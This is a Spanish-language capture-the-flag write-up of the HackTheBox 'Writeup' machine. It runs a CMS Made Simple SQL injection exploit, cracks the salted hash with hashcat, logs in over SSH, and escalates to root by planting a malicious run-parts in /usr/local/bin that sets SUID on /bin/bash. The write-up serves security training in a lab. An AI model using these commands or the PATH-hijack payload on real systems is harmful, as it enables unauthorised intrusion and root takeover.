- Tags: #web_enumeration #linux #pathhijacking #process_enumeration #cracking_hash_salt

![portada.png](/assets/images/WriteUp/portada.png)

# RECONOCIMIENTO
----------

- Verificación de `SO`

```bash
ping -c 1 10.10.10.138
```

- Escaneo de puertos abiertos dentro de la maquina

```bash
namp -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.138 -oG allPorts
```

- Información mas detallada sobre los servicios que corren por detrás de los puertos abiertos

```bash
nmap -p80,22 -sCV 10.10.10.138 -oN targeted
```

- Script de reconocimiento básico sobre los directorios abiertos

```bash
nmap -p80 --script=http-enum 10.10.10.138 -oN webScan
```

- Información básica sobre la pagina web

```bash
whatweb http://writeup.htb/writeup/
```

---------
# EXPLOTACIÓN
-----------

- **Nos damos cuenta de que es un CMS Made Simple 2019**

![Pasted image 20240829225020.png](/assets/images/WriteUp/Pastedimage20240829225020.png)

- **Ejecutamos el exploit y lo que sacamos de el es lo siguiente:**

```bash
python2.7 46635.py -u http://10.10.10.138/writeup
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

----------
# CRACKEO DE PASSWORDS
---------

**Como vemos encontramos dos hashes, uno es un hash `md5` normal y otro pone `salt` , por lo que sabemos que la password se ha hasheado con un `salt`, por lo que para descifrar dicho `hash` haremos lo siguiente:**

>Fichero hash.txt
```bash
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
```

**Hemos puesto el hash al principio separado por `:` el salt**

>Comando de hashcat:


```bash
hashcat -m 20 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
```

- Resultado:

```bash
File: cracked.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

-------------
# SSH
-------

```bash
❯ ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug 29 13:25:30 2024 from 10.10.16.4
jkr@writeup:~$
```

**USER**

```bash
jkr@writeup:~$ cat user.txt 
a7e8af276747a411dc39b0206d00e219
jkr@writeup:~$
```

-----------
# ESCALADA DE PRIVILEGIOS
----------

- **Al ejecutar el comando `id` vemos lo siguiente:**

```bash
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

- **Como vemos hay un grupo `staff` que se sale de lo normal, por lo que vamos a ver que es lo que hace este grupo en especifico.**

>`STAFF`
- `Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may "override" the executables in /bin and /usr/bin with the same name). Compare with group "adm", which is more related to monitoring/security.`

**Por lo que al ser del grupo `staff` podemos escribir en `usr/local/bin` & `usr/local/sbin`**

>Ambas rutas suelen estar en la variable de entorno $PATH del usuario root, lo que significa
>lo que significa que podríamos reemplazar un programa que root probablemente ejecute fuera de esos directorios con un archivo malicioso que contenga una carga útil que nos permita escalar nuestros privilegios que contenga una carga útil que nos permita escalar nuestros privilegios.

- **Para ver los procesos que esta ejecutando el usuario `root` en el sistema hacemos lo siguiente**

`Ejecutamos el script pspy`

```bash
jkr@writeup:/tmp/$ ./pspy32
```

----------
# PATH HIJACKING
----------

**Al ejecutar la herramienta vemos lo siguiente interesante:**

```bash
<...SNIP...>
2019/06/09 08:45:43 CMD: UID=0 PID=8528 | sshd: [accepted]
2019/06/09 08:45:43 CMD: UID=0 PID=8529 | sshd: [accepted]
2019/06/09 08:45:43 CMD: UID=0 PID=8530 | sshd: jkr [priv]
2019/06/09 08:45:43 CMD: UID=0 PID=8531 | sh -c /usr/bin/env -i
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --
lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2019/06/09 08:45:43 CMD: UID=0 PID=8532 | run-parts --lsbsysinit /etc/update-
motd.d
2019/06/09 08:45:43 CMD: UID=0 PID=8533 | /bin/sh /etc/update-motd.d/10-uname
<...SNIP...>
```

Como vemos se esta haciendo una llamada a la función `run-parts`, en el directorio `/bin` cada vez que un cliente nuevo se conecta por ssh. Por lo que podemos hacer es crear un script llamado `run-parts` que haga lo siguiente:

```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```

**Esto lo que hará es que como el sistema empezara buscando por el principio del `PATH` hasta encontrar el binario `run-parts`, nosotros ponemos nuestro binario malicioso al principio del `PATH` que tenemos permisos de escritura y esto en vez de hacer las funciones de `run-parts` nos proporcionara una `/bin/bash suid`**

- De ultimas ejecutar un `bash -p` y nos dará una shell `root`.
